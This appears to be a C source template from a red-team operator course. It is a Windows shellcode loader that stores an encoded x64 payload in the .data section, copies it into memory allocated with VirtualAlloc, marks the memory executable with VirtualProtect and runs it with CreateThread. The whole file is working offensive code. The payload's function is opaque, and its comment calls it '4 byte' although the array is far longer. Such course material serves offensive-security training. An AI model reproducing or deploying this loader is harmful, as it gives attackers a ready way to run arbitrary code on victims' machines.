/*

 Red Team Operator course code template
 storing payload in .data section
 
 author: reenz0h (twitter: @sektor7net)

*/
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// 4 byte payload
unsigned char payload[] = { 0x48,0x31,0xc9,0x48,0x81,0xe9,
0xdd,0xff,0xff,0xff,0x48,0x8d,0x05,0xef,0xff,0xff,0xff,0x48,
0xbb,0xde,0x8f,0x09,0xd0,0x94,0x87,0x0e,0xa7,0x48,0x31,0x58,
0x27,0x48,0x2d,0xf8,0xff,0xff,0xff,0xe2,0xf4,0x22,0xc7,0x8a,
0x34,0x64,0x6f,0xce,0xa7,0xde,0x8f,0x48,0x81,0xd5,0xd7,0x5c,
0xf6,0x88,0xc7,0x38,0x02,0xf1,0xcf,0x85,0xf5,0xbe,0xc7,0x82,
0x82,0x8c,0xcf,0x85,0xf5,0xfe,0xc7,0x82,0xa2,0xc4,0xcf,0x01,
0x10,0x94,0xc5,0x44,0xe1,0x5d,0xcf,0x3f,0x67,0x72,0xb3,0x68,
0xac,0x96,0xab,0x2e,0xe6,0x1f,0x46,0x04,0x91,0x95,0x46,0xec,
0x4a,0x8c,0xce,0x58,0x98,0x1f,0xd5,0x2e,0x2c,0x9c,0xb3,0x41,
0xd1,0x44,0x0c,0x8e,0x2f,0xde,0x8f,0x09,0x98,0x11,0x47,0x7a,
0xc0,0x96,0x8e,0xd9,0x80,0x1f,0xcf,0x16,0xe3,0x55,0xcf,0x29,
0x99,0x95,0x57,0xed,0xf1,0x96,0x70,0xc0,0x91,0x1f,0xb3,0x86,
0xef,0xdf,0x59,0x44,0xe1,0x5d,0xcf,0x3f,0x67,0x72,0xce,0xc8,
0x19,0x99,0xc6,0x0f,0x66,0xe6,0x6f,0x7c,0x21,0xd8,0x84,0x42,
0x83,0xd6,0xca,0x30,0x01,0xe1,0x5f,0x56,0xe3,0x55,0xcf,0x2d,
0x99,0x95,0x57,0x68,0xe6,0x55,0x83,0x41,0x94,0x1f,0xc7,0x12,
0xee,0xdf,0x5f,0x48,0x5b,0x90,0x0f,0x46,0xa6,0x0e,0xce,0x51,
0x91,0xcc,0xd9,0x57,0xfd,0x9f,0xd7,0x48,0x89,0xd5,0xdd,0x46,
0x24,0x32,0xaf,0x48,0x82,0x6b,0x67,0x56,0xe6,0x87,0xd5,0x41,
0x5b,0x86,0x6e,0x59,0x58,0x21,0x70,0x54,0x98,0x2e,0x86,0x0e,
0xa7,0xde,0x8f,0x09,0xd0,0x94,0xcf,0x83,0x2a,0xdf,0x8e,0x09,
0xd0,0xd5,0x3d,0x3f,0x2c,0xb1,0x08,0xf6,0x05,0x2f,0x77,0xbb,
0x05,0x88,0xce,0xb3,0x76,0x01,0x3a,0x93,0x58,0x0b,0xc7,0x8a,
0x14,0xbc,0xbb,0x08,0xdb,0xd4,0x0f,0xf2,0x30,0xe1,0x82,0xb5,
0xe0,0xcd,0xfd,0x66,0xba,0x94,0xde,0x4f,0x2e,0x04,0x70,0xdc,
0xb3,0xf5,0xeb,0x6d,0x89,0xbb,0xf7,0x6c,0xd0,0x94,0x87,0x0e,
0xa7};

unsigned int payload_len = sizeof(payload);

int main(void) {
    
	void * exec_mem;
	BOOL rv;
	HANDLE th;
    DWORD oldprotect = 0;

	// Allocate a memory buffer for payload
	exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	printf("%-20s : 0x%-016p\n", "payload addr", (void *)payload);
	printf("%-20s : 0x%-016p\n", "exec_mem addr", (void *)exec_mem);

	// Copy payload to new buffer
	RtlMoveMemory(exec_mem, payload, payload_len);

	// Make new buffer as executable
	rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);

	printf("\nHit me!\n");
	getchar();

	// If all good, run the payload
	if ( rv != 0 ) {
			th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
			WaitForSingleObject(th, -1);
	}

	return 0;
}
